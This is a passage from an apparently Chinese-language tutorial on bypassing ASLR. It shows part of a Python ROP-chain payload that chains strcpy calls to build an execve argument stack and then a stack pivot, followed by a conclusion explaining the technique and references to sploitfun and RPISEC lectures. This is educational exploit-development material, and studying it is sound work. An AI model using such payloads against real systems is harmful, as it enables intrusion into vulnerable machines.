payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(execve_argv_dst)
payload += p32(execve_null_arg)

execve_argv_dst += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(execve_argv_dst)
payload += p32(execve_null_arg)

execve_argv_dst += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(execve_argv_dst)
payload += p32(execve_null_arg)

# Stack Pivot
payload += p32(pr_addr)
payload += p32(cust_base_esp)
payload += p32(lr_addr)

```
如此`custom stack`就构造完成了.

# conclusion

虽然构造`custome`完成了, 但是之前覆写部分的`gadget`是取自`libc`, 其位置受到共享库随机化影响, 导致`bypass`aslr 失败.
`sploitfun`思路借鉴了 [^paper] 是利用`text`不参与随机化的特点, 而从中抽取`gadget`构造`rop chain`来覆写`GOT`, 而后通过`strcpy`(或者其他复制函数) 把参数复制进入`custom stack`, 在利用`stack pivoting`技术调整当前栈位置, 等待接下来`call execve()`. 不过个人认为调用`execve()`这样的函数真是很麻烦参数太多, 可以尝试`system()`代替.

### reference

[^binary]: [生成的代码](../media/attach/aslr_3)
[^origin]: [sploitfun](https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-iii/)
[^paper]: [BlackHat-USA-2010-Le-Paper-Payload-already-inside-data-reuse-for-ROP-exploits](http://media.blackhat.com/bh-us-10/whitepapers/Le/BlackHat-USA-2010-Le-Paper-Payload-already-inside-data-reuse-for-ROP-exploits-wp.pdf)
[^mbe]: [stack pivoting 演示 07_lecture](https://github.com/RPISEC/MBE/releases/download/v1.1_release/MBE_lectures.tar.gz)
